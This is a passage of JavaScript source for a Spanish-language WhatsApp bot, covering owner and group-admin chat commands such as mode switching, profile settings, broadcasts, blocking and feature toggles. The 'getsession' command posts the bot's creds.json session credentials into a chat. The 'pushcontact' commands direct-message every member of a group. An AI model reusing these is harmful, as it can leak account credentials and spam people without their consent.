                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygc(teks)
            }
            break
case 'delsession':
case 'clearsession': {
    if (!TheCreator) return StickOwner()
    fs.readdir("./session", async function(err, files) {
        if (err) {
            console.log('No se pudo escanear el directorio: ' + err);
            return replygc('No se pudo escanear el directorio: ' + err);
        }
        let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
            item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
        )
        console.log(filteredArray.length);
        let teks = `Detectados ${filteredArray.length} archivos basura\n\n`
        if (filteredArray.length == 0) return replygc(teks)
        filteredArray.map(function(e, i) {
            teks += (i + 1) + `. ${e}\n`
        })
        replygc(teks)
        await sleep(2000)
        replygc("Eliminando archivos basura...")
        await filteredArray.forEach(function(file) {
            fs.unlinkSync(`./session/${file}`)
        });
        await sleep(2000)
        replygc("Se eliminaron con éxito todos los archivos basura en la carpeta de sesión")
    });
}
break
case 'join':
    try {
        if (!TheCreator) {
            let ownerMessage = `El usuario *@${m.sender.split("@")[0]}* solicitó unirse a un grupo. Por favor, agrégalo manualmente.`;
            for (let i of owner) {
                SenseiOfc.sendMessage(i + "@s.whatsapp.net", {
                    text: ownerMessage,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                });
            }
            return replygc('Tu solicitud ha sido enviada al creador. Espera a ser agregado al grupo.');
        }

        if (!text) return replygc('¡Ingresa el enlace del grupo!');
        if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygc('Enlace no válido');

        let result = args[0].split('https://chat.whatsapp.com/')[1];
        SenseiOfc.groupAcceptInvite(result);
        await replygc(`Listo`);
    } catch {
        replygc('Error al unirse al grupo');
    }
    break
case 'getsession':
    if (!TheCreator) return StickOwner()
    replygc('Espera un momento, actualmente estoy recuperando tu archivo de sesión')
    let sesi = fs.readFileSync('./session/creds.json')
    SenseiOfc.sendMessage(m.chat, {
        document: sesi,
        mimetype: 'application/json',
        fileName: 'creds.json'
    }, {
        quoted: m
    })
break
case 'myip':
case 'ipbot':
    if (!TheCreator) return StickOwner()
    var http = require('http')
    http.get({
        'host': 'api.ipify.org',
        'port': 80,
        'path': '/'
    }, function(resp) {
        resp.on('data', function(ip) {
            replygc("🔎 Mi dirección IP pública es: " + ip);
        })
    })
break
case 'request':
case 'reportbug': {
    if (!text) return replygc(`Ejemplo: ${
        prefix + command
      } hola dev el comando play no está funcionando`)
    textt = `*| SOLICITUD/ERROR |*`
    teks1 = `\n\n*Usuario* : @${
       m.sender.split("@")[0]
      }\n*Solicitud/Error* : ${text}`
    teks2 = `\n\n*Hola ${pushname}, tu solicitud ha sido enviada a mis propietarios*.\n*Por favor espera...*`
    for (let i of owner) {
        SenseiOfc.sendMessage(i + "@s.whatsapp.net", {
            text: textt + teks1,
            mentions: [m.sender],
        }, {
            quoted: m,
        })
    }
    SenseiOfc.sendMessage(m.chat, {
        text: textt + teks2 + teks1,
        mentions: [m.sender],
    }, {
        quoted: m,
    })
}
break
case 'nombrebot': case 'setnamebot': {
    if (!TheCreator) return StickOwner();
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setnombrebot <NuevoNombreBot>`);
    }
    let newBotname = args.join(' ').trim();
    setBotInfo(newBotname);
    replygc(`Nombre del bot cambiado a: ${newBotname}`);
}
break
case 'reiniciar': case 'actualizar':
    if (!TheCreator) return StickOwner()
    replygc(`El reinicio se completará en segundos`);
    await sleep(3000);
    process.exit();
break
            case 'self': case 'privado': {
    if (!TheCreator) return StickOwner()
    SenseiOfc.public = false
    replygc('*Éxito al cambiar al modo privado*')
}
break
case 'public': case 'publico': {
    if (!TheCreator) return StickOwner()
    SenseiOfc.public = true
    replygc('*Éxito al cambiar al modo público*')
}
break
case 'mode': {
    if (!TheCreator) return StickOwner()
    if (args.length < 1) return replygc(`Ejemplo: ${prefix + command} publico/privado`)
    
    const mode = args[0].toLowerCase()
    if (mode === 'publico') {
        SenseiOfc.public = true
        replygc(mess.done)
    } else if (mode === 'privado') {
        SenseiOfc.public = false
        replygc(mess.done)
    } else {
        replygc('Modo no válido. Use "publico" o "privado".')
    }
}
break
case 'setexif':
case 'setwm':
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Ejemplo : ${prefix + command} nombrepack|autor`)
    global.packname = text.split("|")[0]
    global.author = text.split("|")[1]
    replygc(`Exif cambiado con éxito a\n\n• Nombre del pack : ${global.packname}\n• Autor : ${global.author}`)
break
case 'setprefix':
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Ejemplo : ${prefix + command} nuevoprefix`)
    global.xprefix = text
    replygc(`Prefijo cambiado con éxito a ${text}`)
break
case 'setautoblock':
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Ejemplo : ${prefix + command} número`)
    global.autoblocknumber = text
    replygc(`Auto-Bloqueo del número cambiado con éxito a ${text}`)
break
case 'setantiforeign':
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Ejemplo : ${prefix + command} número`)
    global.antiforeignnumber = text
    replygc(`Número anti-extranjero cambiado con éxito a ${text}`)
break
case 'setbotpp':
case 'setpp':
    if (!TheCreator) return StickOwner()
    if (!quoted) return replygc(`Envía/Responde una imagen con el título ${prefix + command}`)
    if (!/image/.test(mime)) return replygc(`Envía/Responde una imagen con el título ${prefix + command}`)
    if (/webp/.test(mime)) return replygc(`Envía/Responde una imagen con el título ${prefix + command}`)
    var medis = await SenseiOfc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
    if (args[0] == 'full') {
        var {
            img
        } = await generateProfilePicture(medis)
        await SenseiOfc.query({
            tag: 'iq',
            attrs: {
                to: botNumber,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [{
                tag: 'picture',
                attrs: {
                    type: 'image'
                },
                content: img
            }]
        })
        fs.unlinkSync(medis)
        replygc(mess.done)
    } else {
        var memeg = await SenseiOfc.updateProfilePicture(botNumber, {
            url: medis
        })
        fs.unlinkSync(medis)
        replygc(mess.done)
    }
break
case 'leave':
case 'salir':
    if (!TheCreator) return StickOwner()
    if (!m.isGroup) return StickGroup()
    replygc('Adiós a todos 🥺')
    await SenseiOfc.groupLeave(m.chat)
break
case 'bc':
case 'broadcast':
    if (!TheCreator) return StickOwner()
    if (!text) return replygc('¿Texto?')
    let teksnya = `${text}\n\n\n\nFecha: ${xdate} ${xtime}`
    for (let i of Object.keys(global.db.data.users)) {
        await sleep(1500)
        if (/image/.test(mime)) {
            var media = await quoted.download()
            await SenseiOfc.sendMessage(i, {
                image: media,
                caption: teksnya
            })
        } else if (/video/.test(mime)) {
            var media = await quoted.download()
            await SenseiOfc.sendMessage(i, {
                video: media,
                caption: teksnya
            })
        } else if (text) {
            await SenseiOfc.sendMessage(i, {
                text: teksnya
            })
        }
    }
    replygc(`Éxito ${command} para ${Object.keys(global.db.data.users).length} usuarios`)
break
case 'pushcontact':
    if (!TheCreator) return StickOwner()
    if (!m.isGroup) return replygc(`Esta función solo funciona en grupos`)
    if (!text) return replygc(`¿Texto?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygc(`Éxito al enviar el mensaje a los contactos`)
    for (let pler of mem) {
        SenseiOfc.sendMessage(pler, { text: q })
    }
    replygc(`Hecho`)
break
case 'pushcontactv2':
    if (!TheCreator) return StickOwner()
    if (!q) return replygc(`Uso incorrecto. Utilice el comando así\n${prefix+command} idgc|texto`)
    await StickWait()
    const metadata2 = await SenseiOfc.groupMetadata(q.split("|")[0])
    const halss = metadata2.participants
    for (let mem of halss) {
        SenseiOfc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
        await sleep(5000)
    }
    replygc(`Éxito`)
break
case 'block': case 'ban': {
		if (!TheCreator) return StickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await SenseiOfc.updateBlockStatus(users, 'block')
		await replygc(`Done`)
	}
	break
	case 'unblock': case 'unban': case 'desbloquear': {
		if (!TheCreator) return StickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await SenseiOfc.updateBlockStatus(users, 'unblock')
		await replygc(`Done`)
	}
	break
case 'bcgc':
case 'bcgroup': {
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`¿Dónde está el texto?\n\nEjemplo: ${prefix + command} Mañana es día libre`)
    let getGroups = await SenseiOfc.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
    let anu = groups.map(v => v.id)
    replygc(`Enviando difusión a ${anu.length} grupos, tiempo estimado ${anu.length * 1.5} segundos`)
    for (let i of anu) {
        await sleep(1500)
        let a = `Difusión de ${ownername}\n\n` + '```' + `Mensaje: ${text}\n\n` + '```'
        SenseiOfc.sendMessage(i, {
            text: a,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: `Enviado en ${i.length} grupo(s)`,
                    thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
    }
    replygc(`Éxito en enviar la difusión a ${anu.length} grupos`)
}
break
case 'getcase':
    if (!TheCreator) return StickOwner()
    try {
        const getCase = (cases) => {
            return "case" + `'${cases}'` + fs.readFileSync("XeonCheems10.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
        }
        replygc(`${getCase(q)}`)
    } catch {
        replygc(`¡Caso ${q} no encontrado!`)
    }
break
//group
case 'antibadword':
case 'antitoxic':{
    if (!m.isGroup) return StickGroup()
    if (!isBotAdmins) return StickBotAdmin()
    if (!isAdmins && !TheCreator) return StickAdmin()
    if (args.length < 1) return replygc('¿on/off?')
    if (args[0] === 'on') {
        db.data.chats[from].badword = true
        replygc(`${command} habilitado`)
    } else if (args[0] === 'off') {
        db.data.chats[from].badword = false
        replygc(`${command} deshabilitado`)
    }
}
break
case 'react': {
    if (!TheCreator) return StickOwner()
    reactionMessage = {
        react: {
            text: args[0],
            key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
        }
    }
    SenseiOfc.sendMessage(m.chat, reactionMessage)
}
break
case 'nsfw': {
    if (!m.isGroup) return StickGroup()
    if (!isBotAdmins) return StickBotAdmin()
    if (!isAdmins && !TheCreator) return StickAdmin()
    if (args[0] === "on") {
        if (AntiNsfw) return replygc('Ya está activado')
        ntnsfw.push(from)
        fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
        replygc('Éxito al activar NSFW en este grupo')
        var groupe = await SenseiOfc.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        SenseiOfc.sendMessage(from, {text: `\`\`\`「 ⚠️Advertencia⚠️ 」\`\`\`\n\nLa función NSFW (no seguro para el trabajo) ha sido habilitada en este grupo, ¡lo que significa que uno puede acceder a contenido gráfico!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
    } else if (args[0] === "off") {
        if (!AntiNsfw) return replygc('Ya está desactivado')
        let off = ntnsfw.indexOf(from)
        ntnsfw.splice(off, 1)
        fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
        replygc('Éxito al desactivar NSFW en este grupo')
    } else {
        await replygc(`Por favor, escriba la opción\n\nEjemplo: ${prefix + command} on\nEjemplo: ${prefix + command} off\n\non para habilitar\noff para desactivar`)
    }
}
break
            case 'id':{
            replygc(from)
           }
          break
            case 'poll': case 'encuesta': {
	if (!TheCreator) return StickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygc(
                    `Mencione la pregunta y al menos 2 opciones\Ejemplo: ${prefix}poll ¿Cuál es el mejor admin?|Xeon,Cheems,Doge.`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await SenseiOfc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
case 'setnombrebot':
case 'nombrebot': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setnombrebot <NuevoNombreBot>`)
    }
    let newBotname = args.join(' ').trim()
    setBotInfo(newBotname)
    replygc(`Nombre del bot cambiado a: ${newBotname}`)
}
break
case 'setnombrepropietario':
case 'nombrepropietario': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setnombrepropietario <NuevoNombrePropietario>`)
    }
    let newOwnername = args.join(' ').trim()
    setBotInfo(global.botname, newOwnername, global.location, global.ownernumber, global.ytname, global.socialm, global.themeemoji, global.websitex, global.wagc)
    replygc(`Nombre del propietario cambiado a: ${newOwnername}`)
}
break
case 'setubicacion':
case 'ubicacion': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setubicacion <NuevaUbicación>`)
    }
    let newLocation = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, newLocation, global.ownernumber, global.ytname, global.socialm, global.themeemoji, global.websitex, global.wagc)
    replygc(`Ubicación cambiada a: ${newLocation}`)
}
break
case 'setnumeropropietario':
case 'numeropropietario': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setnumeropropietario <NuevoNúmero>`)
    }
    let newOwnernumber = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, global.location, newOwnernumber, global.ytname, global.socialm, global.themeemoji, global.websitex, global.wagc)
    replygc(`Número del propietario cambiado a: ${newOwnernumber}`)
}
break
case 'setnombreyt':
case 'nombreyt': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setnombreyt <NuevoNombreYT>`)
    }
    let newYtname = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, global.location, global.ownernumber, newYtname, global.socialm, global.themeemoji, global.websitex, global.wagc)
    replygc(`Nombre del canal de YouTube cambiado a: ${newYtname}`)
}
break
case 'setsocialmedia':
case 'socialmedia': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setsocialmedia <NuevaRedSocial>`)
    }
    let newSocialm = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, global.location, global.ownernumber, global.ytname, newSocialm, global.themeemoji, global.websitex, global.wagc)
    replygc(`Redes sociales del propietario cambiadas a: ${newSocialm}`)
}
break
case 'setemojitema':
case 'emojitema': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setemojitema <NuevoEmojiTema>`)
    }
    let newThemeemoji = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, global.location, global.ownernumber, global.ytname, global.socialm, newThemeemoji, global.websitex, global.wagc)
    replygc(`Emoji del tema cambiado a: ${newThemeemoji}`)
}
break
case 'setwebsitex':
case 'websitex': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setwebsitex <NuevoSitioWebPropietario>`)
    }
    let newWebsitex = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, global.location, global.ownernumber, global.ytname, global.socialm, global.themeemoji, newWebsitex, global.wagc)
    replygc(`Sitio web del propietario cambiado a: ${newWebsitex}`)
}
break
case 'setlink':
case 'newlink': {
    if (!TheCreator) return StickOwner()
    if (args.length === 0) {
        return replygc(`El comando está incompleto. Debe ser así: setwebsitex <NuevoSitioWebX>`)
    }
    let newWagc = args.join(' ').trim()
    setBotInfo(global.botname, global.ownername, global.location, global.ownernumber, global.ytname, global.socialm, global.themeemoji, global.websitex, newWagc)
    replygc(`Sitio web X cambiado a: ${newWagc}`)
}
break
case 'activar': {
    if (args.length < 1) return replygc('Especifica la función que deseas activar.\nEjemplo: activar adminevent\n\nLas funciones disponibles son:\n -welcome\n -antilink\n -antilinkgc\n -antilocation\n -anticontact\n -anticontact\n -anticontact\n -antidocument\n -antimedia\n -antiviewonce\n -antibot\n -antivirtex\n -antivirtex\n -antivideo\n -antiimage\n -antisticker\n -antipoll\n -antiforeign\n -antiaudio\n -adminevent\n -groupevent\n -ephemeral\n -autoswview\n -autostatusview\n -unavailable\n -autorecordtype\n -autorecord\n -autotype\n -autobio\n -autosticker\n -autoblock\n -sologc\n -solopv\n -onlyindia\n -onlyindonumber')

    const functionToActivate = args.join(' ').toLowerCase()

    switch (functionToActivate) {
	case 'welcome':
            if (!m.isGroup) return replygc('Esta función solo se puede activar en grupos')
            if (!isAdmins && !TheCreator) return StickAdmin()
            welcome = true
            replygc('Función de bienvenida activada')
            break
        case 'antiaudio':
        case 'antiforeign':
        case 'antipoll':
        case 'antisticker':
        case 'antiimage':
        case 'antivideo':
        case 'antivirtex':
        case 'antibot':
        case 'antiviewonce':
        case 'antimedia':
        case 'antidocument':
        case 'anticontact':
        case 'antilocation':
        case 'antilink':
        case 'antilinkgc':
        case 'adminevent':
        case 'groupevent':
        case 'ephemeral':
        case 'autoswview':
        case 'autostatusview':
        case 'unavailable':
        case 'autorecordtype':
        case 'autorecord':
        case 'autotype':
        case 'autobio':
        case 'autosticker':
        case 'autostickergc':
        case 'autoblock':
        case 'sologc':
        case 'onlygc':
        case 'solopv':
        case 'onlypc':
        case 'onlyindia':
        case 'onlyindianumber':
        case 'onlyindo':
        case 'onlyindonumber':
        case 'self':
        case 'privado':
        case 'public':
        case 'publico':

            switch (functionToActivate) {
		case 'antiaudio':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antiaudio = true
                    replygc('Función antiaudio activada')
                    break
                case 'antiforeign':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[m.chat].antiforeignnum = true
                    replygc('Función antiforeign activada')
                    break
                case 'antipoll':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antipoll = true
                    replygc('Función antipoll activada')
                    break
                case 'antisticker':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antisticker = true
                    replygc('Función antisticker activada')
                    break
                case 'antiimage':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antiimage = true
                    replygc('Función antiimage activada')
                    break
                case 'antivideo':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antivideo = true
                    replygc('Función antivideo activada')
                    break
                case 'antivirtex':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antivirtex = true
                    replygc('Función antivirtex activada')
                    break
                case 'antibot':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antibot = true
                    replygc('Función antibot activada')
                    break
                case 'antiviewonce':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antiviewonce = true
                    replygc('Función antiviewonce activada')
                    break
                case 'antimedia':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antimedia = true
                    replygc('Función antimedia activada')
                    break
                case 'antidocument':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antidocument = true
                    replygc('Función antidocument activada')
                    break
                case 'anticontact':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].anticontact = true
                    replygc('Función anticontact activada')
                    break
                case 'antilocation':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antilocation = true
                    replygc('Función antilocation activada')
                    break
                case 'antilink':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antilink = true
                    replygc('Función antilink activada')
                    break
                case 'antilinkgc':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antilinkgc = true
                    replygc('Función antilinkgc activada')
                    break
                case 'adminevent':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    adminevent = true
                    replygc('Función adminevent activada')
                    break
                case 'groupevent':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    groupevent = true
                    replygc('Función groupevent activada')
                    break
                case 'ephemeral':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    await SenseiOfc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    replygc('Función ephemeral activada')
                    break
                case 'autoswview':
                case 'autostatusview':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    antiswview = true
                    replygc('Función autoswview/autostatusview activada')
                    break
                case 'unavailable':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].online = false
                    replygc('Función unavailable activada')
                    break
                case 'autorecordtype':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autorecordtype = true
                    replygc('Función autorecordtype activada')
                    break
                case 'autorecord':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autorecord = true
                    replygc('Función autorecord activada')
                    break
                case 'autotype':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autotype = true
                    replygc('Función autotype activada')
                    break
                case 'autobio':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autobio = true
                    replygc('Función autobio activada')
                    break
                case 'autosticker':
                case 'autostickergc':
		if (!m.isGroup) return StickGroup()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autosticker = true
                    replygc('Función autosticker activada')
                    break
                case 'autoblock':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autoblocknum = true
                    replygc('Función autoblock activada')
                    break
                case 'sologc':
                case 'onlygc':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlygrub = true
                    replygc('Función sologc/onlygc activada')
                    break
                case 'solopv':
                case 'onlypc':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlypc = true
                    replygc('Función solopv/onlypc activada')
                    break
                case 'onlyindia':
                case 'onlyindianumber':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlyindia = true
                    replygc('Función onlyindia activada')
                    break
                case 'onlyindo':
                case 'onlyindonumber':
            if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlyindo = true
                    replygc('Función onlyindo activada')
                    break
                    }
                default:
            replygc('Función no válida. Las funciones disponibles son:\n\n -welcome\n -antilink\n -antilinkgc\n -antilocation\n -anticontact\n -anticontact\n -anticontact\n -antidocument\n -antimedia\n -antiviewonce\n -antibot\n -antivirtex\n -antivirtex\n -antivideo\n -antiimage\n -antisticker\n -antipoll\n -antiforeign\n -antiaudio\n -adminevent\n -groupevent\n -ephemeral\n -autoswview\n -autostatusview\n -unavailable\n -autorecordtype\n -autorecord\n -autotype\n -autobio\n -autosticker\n -autoblock\n -sologc\n -solopv\n -onlyindia\n -onlyindonumber')
    }
}
break
case 'desactivar': {
    if (args.length < 1) return replygc('Especifica la función que deseas desactivar.\nEjemplo: desactivar welcome\n\nLas funciones disponibles son:\n -welcome\n -antilink\n -antilinkgc\n -antilocation\n -anticontact\n -anticontact\n -anticontact\n -antidocument\n -antimedia\n -antiviewonce\n -antibot\n -antivirtex\n -antivirtex\n -antivideo\n -antiimage\n -antisticker\n -antipoll\n -antiforeign\n -antiaudio\n -adminevent\n -groupevent\n -ephemeral\n -autoswview\n -autostatusview\n -unavailable\n -autorecordtype\n -autorecord\n -autotype\n -autobio\n -autosticker\n -autoblock\n -sologc\n -solopv\n -onlyindia\n -onlyindonumber')

    const functionToDeactivate = args.join(' ').toLowerCase()

    switch (functionToDeactivate) {
        case 'welcome':
            if (!m.isGroup) return StickGroup()
		if (!isAdmins && !TheCreator) return StickAdmin()
            if (!isAdmins && !TheCreator) return StickAdmin()
            welcome = false
            replygc('Función de bienvenida desactivada')
            break
        case 'antiaudio':
        case 'antiforeign':
        case 'antipoll':
        case 'antisticker':
        case 'antiimage':
        case 'antivideo':
        case 'antivirtex':
        case 'antibot':
        case 'antiviewonce':
        case 'antimedia':
        case 'antidocument':
        case 'anticontact':
        case 'antilocation':
        case 'antilink':
        case 'antilinkgc':
	case 'adminevent':
        case 'groupevent':
        case 'ephemeral':
        case 'autoswview':
        case 'autostatusview':
        case 'unavailable':
        case 'autorecordtype':
        case 'autorecord':
        case 'autotype':
        case 'autobio':
        case 'autosticker':
        case 'autostickergc':
        case 'autoblock':
        case 'sologc':
        case 'onlygc':
        case 'solopv':
        case 'onlypc':
        case 'onlyindia':
        case 'onlyindianumber':
        case 'onlyindo':
        case 'onlyindonumber':
            switch (functionToDeactivate) {
                case 'antiaudio':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antiaudio = false
                    replygc('Función antiaudio desactivada')
                    break
                case 'antiforeign':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[m.chat].antiforeignnum = false
                    replygc('Función antiforeign desactivada')
                    break
                case 'antisticker':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antisticker = false
                    replygc('Función antisticker desactivada')
                    break
                case 'antiimage':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antiimage = false
                    replygc('Función antiimage desactivada')
                    break
                case 'antivideo':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antivideo = false
                    replygc('Función antivideo desactivada')
                    break
                case 'antivirtex':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antivirtex = false
                    replygc('Función antivirtex desactivada')
                    break
                case 'antibot':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antibot = false
                    replygc('Función antibot desactivada')
                    break
                case 'antiviewonce':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antiviewonce = false
                    replygc('Función antiviewonce desactivada')
                    break
                case 'antimedia':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antimedia = false
                    replygc('Función antimedia desactivada')
                    break
                case 'antidocument':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antidocument = false
                    replygc('Función antidocument desactivada')
                    break
                case 'anticontact':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].anticontact = false
                    replygc('Función anticontact desactivada')
                    break
                case 'antilocation':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antilocation = false
                    replygc('Función antilocation desactivada')
                    break
                case 'antilink':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antilink = false
                    replygc('Función antilink desactivada')
                    break
                case 'antilinkgc':
		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.chats[from].antilinkgc = false
                    replygc('Función antilinkgc desactivada')
                    break
		case 'adminevent':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    adminevent = false
                    replygc('Función adminevent desactivada')
                    break
                case 'groupevent':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    groupevent = false
                    replygc('Función groupevent desactivada')
                    break
                case 'ephemeral':
